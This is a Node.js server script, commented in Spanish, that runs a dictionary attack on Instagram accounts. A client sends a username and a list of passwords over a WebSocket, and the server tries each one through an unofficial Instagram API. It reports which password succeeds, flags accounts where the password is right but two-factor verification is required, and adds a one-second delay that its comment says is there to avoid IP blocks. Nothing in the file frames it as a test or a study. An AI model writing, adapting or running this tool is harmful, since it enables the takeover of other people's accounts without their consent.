const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const cors = require('cors');
const { IgApiClient } = require('instagram-private-api');

const app = express();
app.use(cors()); // Habilitar CORS para todas las rutas

// Crear un servidor HTTP
const server = http.createServer(app);

// Crear un servidor WebSocket
const wss = new WebSocket.Server({ server });

// Función para iniciar sesión en Instagram
async function iniciarSesion(username, password) {
    const ig = new IgApiClient();
    ig.state.generateDevice(username);

    try {
        await ig.account.login(username, password);
        return { success: true, challenge_message: null };
    } catch (error) {
        if (error.name === 'IgCheckpointError') {
            return { success: false, challenge_message: 'Contraseña correcta, pero se requiere verificación de 6 dígitos.' };
        } else if (error.name === 'IgLoginInvalidUserError') {
            return { success: false, challenge_message: null };
        } else if (error.response?.body?.message?.includes('You can log in with your linked Facebook account')) {
            return { success: false, challenge_message: 'La cuenta está vinculada a Facebook. No se puede iniciar sesión directamente.' };
        } else {
            throw error;
        }
    }
}

// Manejar conexiones WebSocket
wss.on('connection', (ws) => {
    console.log('Cliente conectado');

    // Manejar mensajes del cliente
    ws.on('message', async (message) => {
        const data = JSON.parse(message);
        const { username, contraseñas } = data;

        // Verificar si se proporcionó un nombre de usuario y un diccionario de contraseñas
        if (!username || !contraseñas || !Array.isArray(contraseñas)) {
            ws.send(JSON.stringify({ error: 'Datos inválidos' }));
            return;
        }

        // Barajar las contraseñas para evitar patrones predecibles
        const shuffledContraseñas = contraseñas.sort(() => Math.random() - 0.5);

        // Probar cada contraseña
        for (const password of shuffledContraseñas) {
            ws.send(JSON.stringify({ message: `Probando contraseña: ${password}` }));

            try {
                // Intentar iniciar sesión
                const { success, challenge_message } = await iniciarSesion(username, password);

                if (success) {
                    ws.send(JSON.stringify({ result: `Contraseña correcta: ${password}` }));
                    return;
                } else if (challenge_message) {
                    // Si se requiere 2FA o la cuenta está vinculada a Facebook
                    ws.send(JSON.stringify({ result: challenge_message }));
                    return;
                }
            } catch (error) {
                // Otros errores
                ws.send(JSON.stringify({ error: `Error al probar la contraseña '${password}': ${error.message}` }));
                return;
            }

            // Esperar 1 segundo para evitar bloqueos de IP
            await new Promise((resolve) => setTimeout(resolve, 1000));
        }

        ws.send(JSON.stringify({ result: 'No se pudo iniciar sesión.' }));
    });

    // Manejar cierre de conexión
    ws.on('close', () => {
        console.log('Cliente desconectado');
    });
});

// Iniciar el servidor
const PORT = 5000;
server.listen(PORT, () => {
    console.log(`Servidor Node.js con WebSocket escuchando en http://localhost:${PORT}`);
});
